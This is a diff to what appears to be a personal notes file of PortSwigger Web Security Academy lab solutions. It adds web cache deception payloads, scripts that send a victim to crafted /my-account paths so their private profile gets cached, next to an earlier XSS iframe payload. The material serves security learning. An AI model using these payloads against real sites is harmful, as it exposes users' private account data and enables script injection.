@@ -2208,3 +2208,25 @@ Solution (if `url` parameter is present use it as a `Back to Blog` link:
 Deliver (via exploit server) following payload:
 
     <iframe src="https://0a0900ec040f2cb58005120e00bb003f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a0900ec040f2cb58005120e00bb003f.web-security-academy.net';window.x=1;">
+
+## Web cache deception
+
+### Lab: Exploiting path mapping for web cache deception
+
+    https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping
+
+Entice victim to visit web site with following content:
+
+    <script>document.location="https://0a9d008903044f3f805d307f00c30012.web-security-academy.net/my-account/abc.css"</script>
+
+This will cache victim's private profile info. Then visit this URL to get the solution.
+
+### Lab: Exploiting path delimiters for web cache deception
+
+    https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters
+
+Entice victim to visit web site with following content:
+
+    <script>document.location="https://0af6002f0433c9a78018260300a9006d.web-security-academy.net/my-account;cba.css"</script>
+
+This will cache victim's private profile info. Then visit this URL to get the solution.
